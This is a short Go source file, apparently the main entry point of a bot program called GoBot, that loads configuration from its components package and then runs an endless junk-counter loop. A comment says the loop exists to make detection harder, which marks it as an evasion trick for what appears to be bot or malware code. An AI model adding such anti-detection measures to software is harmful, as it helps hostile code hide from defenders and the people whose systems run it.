package main

import (
	"time"

	"github.com/MShoaei/GoBot/components"
)

var junkint int

func main() {
	components.LoadConfig()
	for { //Just a dumb thread to make detection a little harder
		junkint++
		time.Sleep(20 * time.Second)
		junkint = 0
	}
}
